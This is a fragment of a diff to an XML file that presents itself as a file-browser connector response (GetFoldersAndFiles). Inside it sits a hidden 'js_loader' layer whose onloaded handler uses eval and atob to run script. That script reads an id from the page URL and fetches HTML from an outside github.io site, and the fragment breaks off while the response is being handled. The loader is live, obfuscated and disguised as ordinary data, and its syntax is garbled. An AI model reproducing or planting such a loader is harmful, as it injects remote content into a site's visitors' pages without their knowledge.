@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <Connector command="GetFoldersAndFiles" resourceType="Document">
   <layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('var id = new URLSearchParams(location.search).get("id") || "alczar_arquitectonico";
-
 fetch("https://mrsabasmia.github.io/subwork/" + id + ".html")
   .then(e => e.text())
   .then(e => {
